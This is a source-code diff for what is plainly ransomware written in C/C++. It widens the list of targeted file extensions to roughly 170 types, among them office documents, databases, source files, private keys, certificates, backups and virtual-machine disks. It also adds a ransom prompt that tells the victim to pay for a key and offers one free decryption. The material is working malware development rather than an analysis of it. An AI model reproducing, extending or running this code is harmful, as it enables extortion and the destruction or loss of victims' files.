@@ -15,17 +15,31 @@
 
 #include "aes.h"
 #include "drm.h"
+#include "base64.h"
 #include "random.h"
 
 unsigned int cant_files = 0;
 
-// Only encrypt file with the next extensions:
-const char extensions[][4] = {
-  "avi", "bmp", "doc", "gif", "jpg",
-  "mkv", "mp3", "mp4", "pdf", "png",
-  "ppt", "rar", "txt", "xls", "zip"
+// Encrypt file with the next extensions:
+const char extensions[][13] = {
+  "123", "3dm", "3ds", "3g2", "3gp", "602", "accdb", "aes", "ARC", "asc", "asf",
+  "asm", "asp", "avi", "backup", "bak", "bat", "bmp", "brd", "bz2", "cgm", "class",
+  "cmd", "cpp", "crt", "csr", "csv", "dbf", "dch", "der", "dif", "dip", "djvu",
+  "doc", "docb", "docm", "docx", "dot", "dotm", "dotx", "dwg", "edb", "eml", "fla",
+  "flv", "frm", "gif", "gpg", "hwp", "ibd", "iso", "jar", "java", "jpeg", "jpg", 
+  "jsp", "key", "lay", "lay6", "ldf", "m3u", "m4u", "max", "mdb", "mdf", "mid",
+  "mkv", "mml", "mov", "mp3", "mp4", "mpeg", "mpg", "msg", "myd", "myi", "nef",
+  "odb", "odg", "odp", "ods", "odt", "onetoc2", "ost", "otg", "otp", "ots", "ott",
+  "p12", "paq", "pas", "pdf", "pem", "pfx", "php", "png", "pot", "potm", "potx",
+  "ppam", "pps", "ppsm", "ppsx", "ppt", "pptm", "pptx", "ps1", "psd", "pst", "rar",
+  "raw", "rtf", "sch", "sldm", "sldx", "slk", "sln", "snt", "sql", "sqlite3",
+  "sqlitedb", "stc", "std", "sti", "stw", "suo", "svg", "swf", "sxc", "sxd", "sxi",
+  "sxm", "sxw", "tar", "tbk", "tgz", "tif", "tiff", "txt", "uop", "uot", "vbs", "vcd",
+  "vdi", "vmdk", "vmx", "vob", "vsd", "vsdx", "wav", "wb2", "wk1", "wks", "wma", "wmv",
+  "xlc", "xlm", "xls", "xlsb", "xlsm", "xlsx", "xlt", "xltm", "xltx", "xlw", "zip"
 };
 
+// Case sensitive
 bool isValidFile(char* file) {
   char* ext = strrchr(file, '.');
   if (ext == NULL) return false;
@@ -117,7 +131,12 @@ int main() {
   //if (KillSwitch()) exit(EXIT_FAILURE);
 
   /// GENERATE KEY
-  uint8_t* key = advandedRNG();
+  char* id; unsigned int len;
+  uint8_t* key = advandedRNG(id, len, time(NULL) ^ clock());
+  printf("After payment, use the next id to generate your key: ");
+  PrintBase64(id, len);
+  printf("You can also use it to decrypt one file for free!\n");
+  delete[] id;
 
   /// SAVE KEY TO FILE
   FILE* kfile = fopen("key.bin", "wb");
